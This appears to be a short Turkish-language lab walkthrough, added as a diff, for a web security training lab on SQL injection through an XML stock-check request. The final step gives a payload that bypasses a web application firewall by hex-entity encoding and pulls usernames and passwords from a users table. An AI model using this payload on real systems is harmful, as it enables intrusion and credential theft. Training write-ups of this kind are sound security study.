@@ -1,0 +1,13 @@
+LAB: SQL injection with filter bypass via XML encoding
+
+1 - Herhangi bir ürünün sayfasına gidip alt taraftaki "Check stock" butonuna basarak isteği Burp Suiteden yakalayın.
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
+
+2 - storeId etiketinin içeriğine 1+1 yazarak bu zaafiyetin sömürülebilir olduğunu görüyoruz.
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>1+1</storeId></stockCheck>
+
+3 - <storeId>1 UNION SELECT NULL</storeId> payloadının yakalandığını görüyoruz.
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>1 UNION SELECT NULL</storeId></stockCheck>
+
+4 - WAF atlatmak için payload;
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1 <@hex_entities>2 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId></stockCheck>
